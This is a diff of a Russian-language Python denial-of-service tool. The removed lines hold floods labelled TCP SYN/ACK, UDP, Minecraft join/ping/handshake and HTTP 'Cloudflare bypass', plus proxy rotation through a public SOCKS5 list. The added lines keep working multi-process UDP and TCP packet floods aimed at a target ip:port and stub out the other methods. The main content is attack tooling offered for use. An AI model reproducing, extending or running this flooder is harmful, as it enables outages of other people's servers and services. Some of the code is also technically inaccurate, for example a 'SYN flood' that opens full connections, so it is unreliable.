@@ -1,33 +1,15 @@
 import socket
 import random
-import time
-import socks
+import threading
 import multiprocessing
 import sys
-import os
-import threading
-import signal
-import requests
-import asyncio
+import time
+import colorama
 from colorama import Fore, Style
-from itertools import cycle
+import itertools
+import signal
 
-# Прокси-серверы для ротации
-PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=socks5"
-
-def get_proxies_from_api():
-    """Получение списка прокси через API"""
-    try:
-        response = requests.get(PROXY_API_URL, timeout=5)
-        proxies = response.text.split("\r\n")
-        return proxies
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка при получении прокси: {e}{Style.RESET_ALL}")
-        return []
-
-def get_random_proxy(proxies):
-    """Выбирает случайный прокси из списка"""
-    return random.choice(proxies)
+colorama.init(autoreset=True)
 
 def animate(stop_event, target_ip, target_port, protocol, duration, workers):
     """Анимация загрузки с выводом информации об атаке."""
@@ -37,166 +19,134 @@ def animate(stop_event, target_ip, target_port, protocol, duration, workers):
         sys.stdout.flush()
         time.sleep(0.5)
 
-def send_tcp_syn(target_ip, target_port, duration):
-    """TCP SYN Flood Attack"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.connect((target_ip, target_port))
-        packet = random._urandom(1024)  # Генерация случайных данных для пакета
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            sock.sendto(packet, (target_ip, target_port))
-        sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка TCP SYN: {e}{Style.RESET_ALL}")
-
-def send_tcp_ack(target_ip, target_port, duration):
-    """TCP ACK Flood Attack"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.connect((target_ip, target_port))
-        packet = random._urandom(1024)  # Генерация случайных данных для пакета
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            sock.sendto(packet, (target_ip, target_port))
-        sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка TCP ACK: {e}{Style.RESET_ALL}")
-
-def send_udp_pps(target_ip, target_port, duration):
-    """UDP Flood with High PPS"""
+def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
+    """Функция для отправки множества UDP-пакетов."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)
+    packet = random._urandom(packet_size)
+    
     end_time = time.time() + duration
     while time.time() < end_time:
-        sock.sendto(packet, (target_ip, target_port))
+        try:
+            sock.sendto(packet, (target_ip, target_port))
+        except Exception as e:
+            print(f"{Fore.RED}❌ Ошибка UDP: {e}{Style.RESET_ALL}")
+            break
+    
     sock.close()
 
-def send_udp_china(target_ip, target_port, duration):
-    """UDP Flood Targeting China Geoblocked Servers"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        sock.sendto(packet, (target_ip, target_port))
-    sock.close()
-
-# Layer 7 Minecraft
-
-def send_mc_ping(target_ip, target_port, duration):
-    """Minecraft Ping Flood"""
+def send_tcp_packets(target_ip, target_port, packet_size=1024, duration=10):
+    """Функция для отправки множества TCP-пакетов."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((target_ip, target_port))
-        ping_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
+        packet = random._urandom(packet_size)
+        
         end_time = time.time() + duration
         while time.time() < end_time:
-            sock.send(ping_packet)
+            try:
+                sock.send(packet)
+            except Exception as e:
+                print(f"{Fore.RED}❌ Ошибка TCP: {e}{Style.RESET_ALL}")
+                break
+    except Exception as e:
+        print(f"{Fore.RED}❌ Ошибка при подключении: {e}{Style.RESET_ALL}")
+    finally:
         sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка Minecraft Ping: {e}{Style.RESET_ALL}")
 
-def send_mc_join(target_ip, target_port, duration):
-    """Minecraft Join Flood"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        join_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            sock.send(join_packet)
-        sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка Minecraft Join: {e}{Style.RESET_ALL}")
+# Протоколы Layer 4
+def tcp_syn_flood(target_ip, target_port, duration):
+    # Логика для атаки TCP-SYN
+    pass
 
-def send_mc_handshake(target_ip, target_port, duration):
-    """Minecraft Handshake Flood"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        handshake_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            sock.send(handshake_packet)
-        sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка Minecraft Handshake: {e}{Style.RESET_ALL}")
+def tcp_ack_flood(target_ip, target_port, duration):
+    # Логика для атаки TCP-ACK
+    pass
 
-def send_mc_tcpbypass(target_ip, target_port, duration):
-    """Minecraft TCP Bypass Flood"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target_ip, target_port))
-        tcp_packet = random._urandom(1024)
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            sock.send(tcp_packet)
-        sock.close()
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка Minecraft TCP Bypass: {e}{Style.RESET_ALL}")
+def udp_pps_flood(target_ip, target_port, duration):
+    # Логика для атаки UDP-PPS
+    pass
 
-# Web Layer 7 (HTTP)
+def udp_china_flood(target_ip, target_port, duration):
+    # Логика для атаки UDPCHINA
+    pass
 
-def send_http_out(target_ip, target_port, duration):
-    """HTTP DDOS bypass method for Cloudflare"""
-    try:
-        url = f"http://{target_ip}:{target_port}"
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            requests.get(url, headers=headers)
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка HTTP OUT: {e}{Style.RESET_ALL}")
+# Протоколы Layer 7
+def mc_cps_flood(target_ip, target_port, duration):
+    # Логика для атаки MC-CPS
+    pass
 
-def send_http_misc(target_ip, target_port, duration):
-    """HTTP Miscellaneous bypass method for Cloudflare"""
-    try:
-        url = f"http://{target_ip}:{target_port}"
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            requests.get(url, headers=headers)
-    except Exception as e:
-        print(f"{Fore.RED}❌ Ошибка HTTP MISC: {e}{Style.RESET_ALL}")
+def mc_join_flood(target_ip, target_port, duration):
+    # Логика для атаки MC-JOIN
+    pass
 
-# Основная функция атаки
-async def run_attack(target_ip, target_port, protocol, duration, workers, proxies):
-    """Запуск атаки с ротацией прокси с использованием асинхронных функций."""
+def mc_ping_flood(target_ip, target_port, duration):
+    # Логика для атаки MC-PING
+    pass
+
+def mc_handshake_flood(target_ip, target_port, duration):
+    # Логика для атаки MC-HANDSHAKE
+    pass
+
+def mc_tcpbypass_flood(target_ip, target_port, duration):
+    # Логика для атаки MC-TCPBYPASS
+    pass
+
+# Протоколы Web (HTTP Layer 7)
+def http_out_flood(target_ip, target_port, duration):
+    # Логика для атаки HTTP-OUT
+    pass
+
+def http_misc_flood(target_ip, target_port, duration):
+    # Логика для атаки HTTP-MISC
+    pass
+
+def run_all_protocols(target_ip, target_port, duration, workers):
+    """Метод ALL - запускает все протоколы по очереди."""
+    protocols = [
+        ('TCP-SYN', tcp_syn_flood),
+        ('TCP-ACK', tcp_ack_flood),
+        ('UDP-PPS', udp_pps_flood),
+        ('UDPCHINA', udp_china_flood),
+        ('MC-CPS', mc_cps_flood),
+        ('MC-JOIN', mc_join_flood),
+        ('MC-PING', mc_ping_flood),
+        ('MC-HANDSHAKE', mc_handshake_flood),
+        ('MC-TCPBYPASS', mc_tcpbypass_flood),
+        ('HTTP-OUT', http_out_flood),
+        ('HTTP-MISC', http_misc_flood)
+    ]
+
+    for protocol_name, protocol_func in protocols:
+        print(f"\n{Fore.GREEN}Запуск атаки {protocol_name}...{Style.RESET_ALL}")
+        protocol_func(target_ip, target_port, duration)
+        time.sleep(2)  # Пауза между атаками
+
+def run_attack(target_ip, target_port, protocol, duration, workers):
+    """Функция для запуска многопоточной и многопроцессорной атаки."""
+    process_list = []
     stop_event = threading.Event()
     anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
     anim_thread.start()
-
-    tasks = []
+    
+    if protocol == "ALL":
+        run_all_protocols(target_ip, target_port, duration, workers)
+        return
+    
     for _ in range(workers):
-        if protocol == "TCP-SYN":
-            task = asyncio.create_task(send_tcp_syn(target_ip, target_port, duration))
-        elif protocol == "TCP-ACK":
-            task = asyncio.create_task(send_tcp_ack(target_ip, target_port, duration))
-        elif protocol == "UDP-PPS":
-            task = asyncio.create_task(send_udp_pps(target_ip, target_port, duration))
-        elif protocol == "UDPCHINA":
-            task = asyncio.create_task(send_udp_china(target_ip, target_port, duration))
-        elif protocol == "MC-PING":
-            task = asyncio.create_task(send_mc_ping(target_ip, target_port, duration))
-        elif protocol == "MC-JOIN":
-            task = asyncio.create_task(send_mc_join(target_ip, target_port, duration))
-        elif protocol == "MC-HANDSHAKE":
-            task = asyncio.create_task(send_mc_handshake(target_ip, target_port, duration))
-        elif protocol == "MC-TCPBYPASS":
-            task = asyncio.create_task(send_mc_tcpbypass(target_ip, target_port, duration))
-        elif protocol == "HTTP-OUT":
-            task = asyncio.create_task(send_http_out(target_ip, target_port, duration))
-        elif protocol == "HTTP-MISC":
-            task = asyncio.create_task(send_http_misc(target_ip, target_port, duration))
+        if protocol == "UDP":
+            process = multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration))
+        elif protocol == "TCP":
+            process = multiprocessing.Process(target=send_tcp_packets, args=(target_ip, target_port, 1024, duration))
         else:
-            print(f"{Fore.RED}🚨 Ошибка: неподдерживаемый протокол {protocol}{Style.RESET_ALL}")
+            print(f"{Fore.RED}🚨 Ошибка: поддерживаемые протоколы - TCP, UDP{Style.RESET_ALL}")
             return
-        tasks.append(task)
-
-    await asyncio.gather(*tasks)
-
+        
+        process.start()
+        process_list.append(process)
+    
+    for process in process_list:
+        process.join()
+    
     stop_event.set()
     sys.stdout.write("\r")
     sys.stdout.flush()
@@ -214,30 +164,23 @@ def signal_handler(sig, frame):
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
     banner()
-
+    
     if len(sys.argv) != 5:
         print(f"{Fore.RED}⚠️ Использование: python z.py ip:port protocol time{Style.RESET_ALL}")
         sys.exit(1)
-
+    
     target = sys.argv[1]
     protocol = sys.argv[2].upper()
     duration = int(sys.argv[3])
     workers = multiprocessing.cpu_count() * 2  # Использует в 2 раза больше потоков, чем ядер
-
-    # Получаем список прокси с API
-    proxies = get_proxies_from_api()
-
-    if not proxies:
-        print(f"{Fore.RED}❌ Прокси не найдены. Завершаем выполнение.{Style.RESET_ALL}")
-        sys.exit(1)
-
+    
     try:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
     except ValueError:
         print(f"{Fore.RED}🚨 Ошибка: неправильный формат ip:port{Style.RESET_ALL}")
         sys.exit(1)
-
+    
     print(f"{Fore.GREEN}💥 Атака началась на {target_ip}:{target_port} через {protocol} на {duration} секунд! 🔥{Style.RESET_ALL}")
-    asyncio.run(run_attack(target_ip, target_port, protocol, duration, workers, proxies))
+    run_attack(target_ip, target_port, protocol, duration, workers)
     print(f"{Fore.BLUE}✅ 🎯 Отправка пакетов завершена!{Style.RESET_ALL}")
